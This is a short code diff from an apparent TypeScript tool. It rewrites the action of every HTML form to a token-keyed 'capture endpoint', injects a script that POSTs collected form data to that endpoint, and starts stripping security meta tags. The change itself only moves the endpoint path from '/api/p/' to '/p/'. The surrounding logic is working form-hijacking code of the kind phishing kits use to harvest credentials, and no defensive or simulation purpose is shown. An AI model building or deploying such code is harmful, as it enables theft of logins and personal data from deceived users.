@@ -151,7 +151,7 @@ function buildFormHookScript(): string {
       }
     }
     var token = new URLSearchParams(window.location.search).get('token') || '';
-    fetch('/api/p/' + token, {
+    fetch('/p/' + token, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
@@ -186,12 +186,12 @@ function hookFormsInHtml(html: string): string {
   // Replace existing form actions with our capture endpoint
   html = html.replace(
     /<form([^>]*)\s+action\s*=\s*["'][^"']*["']/gi,
-    '<form$1 action="/api/p/__TOKEN__"'
+    '<form$1 action="/p/__TOKEN__"'
   );
   // Forms without action — add one
   html = html.replace(
     /<form(?![^>]*action\s*=)([^>]*)>/gi,
-    '<form$1 action="/api/p/__TOKEN__">'
+    '<form$1 action="/p/__TOKEN__">'
   );
 
   // Strip security meta tags
